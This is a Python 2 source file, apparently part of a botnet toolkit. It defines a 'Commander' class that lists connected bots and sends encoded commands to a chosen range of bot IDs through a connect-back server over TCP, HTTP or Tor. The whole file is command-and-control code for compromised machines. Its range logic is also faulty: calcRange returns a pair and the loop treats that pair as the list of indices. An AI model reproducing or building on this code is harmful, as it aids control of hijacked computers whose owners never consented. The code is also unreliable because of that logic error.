'''
Created on Dec 14, 2013

@author: Onur
'''

from bisect import bisect_left, bisect_right

class Commander(object):
    """ Runs or sends commands
        
        This class is used to run local commands 
        and send remote commands to bots
        
        Attributes:
            __server: the server that bots connect back.
    """
    
    __server = None

    def __init__(self, server):
        """ Initializes Commander with a server (TCP, HTTP, Tor)"""
        self.__server = server
    
    def listClients(self):
        """ Gets clients' list from the server and
            prints it to the screen """
        print self.__server.getClientsList() 
    
    def sendCommand(self, interval, cmd):
        """ Sends a command to the clients in the given interval"""
        
        cids = self.__server.getClientIds()
        index = self.calcRange(interval[0], interval[1], cids)
        
        for i in index:
            self.__server.sendData(cids[i], cmd.getEncodedCommand())
        
        return True
    
    def calcRange(self, start, end, array):
        s = bisect_right(array,start)
        e = bisect_left(array,end)
        
        return (s, e)

            